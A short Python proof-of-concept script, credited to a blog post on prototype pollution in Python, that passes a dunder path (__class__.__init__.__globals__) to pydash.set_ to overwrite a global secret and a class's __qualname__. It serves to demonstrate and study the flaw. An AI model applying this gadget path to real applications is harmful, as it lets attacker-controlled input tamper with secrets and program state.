# partly derived from https://blog.abdulrah33m.com/prototype-pollution-in-python/
import pydash

global_secret = "very secret"

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

user = User()
print("global_secret before pydash.set_: " + global_secret)
print("NotAccessibleClass qualname before pydash.set_: "+ NotAccessibleClass.__qualname__)
pydash.set_(user, '__class__.__init__.__globals__.global_secret','1337')
pydash.set_(user, '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
print("global_secret after pydash.set_: " + global_secret)
print("NotAccessibleClass qualname after pydash.set_: "+ NotAccessibleClass.__qualname__)